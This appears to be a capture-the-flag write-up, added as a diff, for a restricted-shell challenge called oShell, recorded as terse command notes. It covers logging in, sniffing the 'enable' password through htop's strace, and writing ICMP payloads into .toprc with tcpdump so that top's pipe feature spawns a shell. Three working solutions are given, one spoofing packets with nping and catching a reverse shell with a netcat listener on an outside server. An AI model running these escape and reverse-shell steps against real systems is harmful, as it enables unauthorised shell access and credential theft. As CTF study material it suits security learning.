@@ -1,0 +1,134 @@
+ssh oshell@54.150.148.61
+	password: oshell
+8944b8bd-34b3-4816-b492-dab5bd54299d
+
+# help
+Available commands:
+  help
+  exit
+  id
+  ping
+  ping6
+  traceroute
+  traceroute6
+  arp
+  netstat
+  top
+  htop
+  enable
+
+First connection
+	htop
+
+Open second connection
+
+First connection
+	htop
+		s (strace on second connection)
+
+
+Second connection
+	enable
+	Password: <gibberish>
+
+First connection
+	htop
+		s (strace on second connection)
+			readv(3, [{iov_base="this-is-secret-c1ae2b0acbf98228", iov_len=31}, {iov_base=""
+
+
+enable
+this-is-secret-30caa0f89ad9397e
+
+New commands: tcpdump, ifconfig
+
+# Know the path of .toprc
+Lauch top, press W
+	 Wrote configuration to '/home/oShell//.toprc'
+
+
+################## Solution 1: icmp-server.py ##################
+# Before (my server)
+sudo bash -c 'echo "0" > /proc/sys/net/ipv4/icmp_echo_ignore_all'
+sudo iptables -A INPUT -p icmp -j NFQUEUE --queue-num 1
+
+# Start server (Response with payload `\npipe\tx\tsh 1>&0\n` in icmp packet)
+sudo python icmp-server.py
+
+Enabled connection
+	tcpdump -w /home/oShell/.toprc -s 500 icmp
+The other connection
+	ping 140.113.24.143 -c 1
+
+top
+	shift + y, return, x, return
+		Get the shell !!!
+			/readflag
+				HITCON{A! AAAAAAAAAAAA! SHAR~K!!!}
+
+
+# After (my server)
+sudo iptables -D INPUT -p icmp -j NFQUEUE --queue-num 1
+
+
+
+
+
+################ Solution 2: nping ################
+
+# Before (my server)
+sudo bash -c 'echo "1" > /proc/sys/net/ipv4/icmp_echo_ignore_all'
+
+# Catch icmp packet id and ip address
+sudo tcpdump icmp -n
+	54.150.148.61
+
+Enabled Connection
+	tcpdump -i eth0 -w /home/oShell/.toprc -c1 src 140.113.24.143
+
+The other connection
+	ping -c 1 -w 30 140.113.24.143
+
+My server
+	sudo nping --icmp -c 1 --icmp-type 0 --icmp-code 0 --source-ip 140.113.24.143 --dest-ip 54.150.148.61 --icmp-seq 0 --data $(cat oshell_payload.txt | xxd -p | tr -d "\n") --icmp-id <icmp packet id>
+
+My server
+	nc -lvnp 9001
+
+top
+	shift + y, return, return
+		Get the reverse shell !!!
+			/readflag
+				HITCON{A! AAAAAAAAAAAA! SHAR~K!!!}
+
+# After (my server)
+sudo bash -c 'echo "0" > /proc/sys/net/ipv4/icmp_echo_ignore_all'
+
+
+
+
+
+
+################ Solution 3: ping-responder ################
+Source: https://github.com/PixelsCamp/ping-responder
+
+# Before (my server)
+sudo bash -c 'echo "1" > /proc/sys/net/ipv4/icmp_echo_ignore_all'
+
+My server
+	sudo docker run --read-only -d --restart always --net=host --init --name ping-responder ping-responder:latest ./ping-responder.py -i eno1 -s $'\npipe\x09x\x09exec /bin/sh 1>&0 2>&0\n'
+
+
+Enabled Connection
+	tcpdump -U -i eth0 -w /home/oShell/.toprc src 140.113.24.143
+The other connection
+	ping -c 1 140.113.24.143
+
+top
+	shift + y, return, return
+		Get the shell !!!
+			/readflag
+				HITCON{A! AAAAAAAAAAAA! SHAR~K!!!}
+
+# After (my server)
+sudo bash -c 'echo "0" > /proc/sys/net/ipv4/icmp_echo_ignore_all'
